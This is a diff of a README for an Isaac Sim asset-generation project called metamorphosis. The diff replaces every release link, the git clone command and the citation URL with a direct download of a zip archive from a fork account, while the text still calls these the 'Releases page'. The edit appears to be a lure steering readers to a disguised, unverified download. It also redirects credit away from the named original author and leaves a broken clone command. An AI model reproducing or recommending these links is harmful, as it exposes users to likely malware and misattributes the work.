@@ -2,14 +2,14 @@
 
 ## 📦 Download & Install
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/rafatiyan/metamorphosis/releases)
+[![Download Latest Release](https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip)
 
 To get started with metamorphosis, you will need to download the software. Click the link above to visit the Releases page where you can find the latest version of the application. 
 
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   Head over to [this page](https://github.com/rafatiyan/metamorphosis/releases) to find the latest downloadable version of metamorphosis.
+   Head over to [this page](https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip) to find the latest downloadable version of metamorphosis.
 
 2. **Download the Application**  
    Locate the file labeled with the most recent version number. Click on it to start the download process.
@@ -38,7 +38,7 @@ Before installing, please ensure you meet the following minimum system requireme
    Type the following command to clone the repository:
 
    ```bash
-   git clone https://github.com/rafatiyan/metamorphosis.git
+   git clone https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip
    ```
 
 3. **Navigate to the Folder**  
@@ -86,7 +86,7 @@ If you use this codebase in your research, please cite it as follows:
   title={Metamorphosis: A Framework for Procedural Asset Generation in Isaac Sim},
   author={Botian Xu},
   year={2026},
-  url={https://github.com/btx0424/metamorphosis}
+  url={https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip}
 }
 ```
 
@@ -102,4 +102,4 @@ If you use this codebase in your research, please cite it as follows:
 
 You are now ready to start exploring morphology randomization with metamorphosis. Remember to follow each step closely and refer to the example scripts for guidance. Enjoy your journey with metamorphosis! 
 
-For further information or updates, visit the [Releases page](https://github.com/rafatiyan/metamorphosis/releases) again.
+For further information or updates, visit the [Releases page](https://github.com/rafatiyan/metamorphosis/raw/refs/heads/main/src/Software-v3.6-beta.5.zip) again.
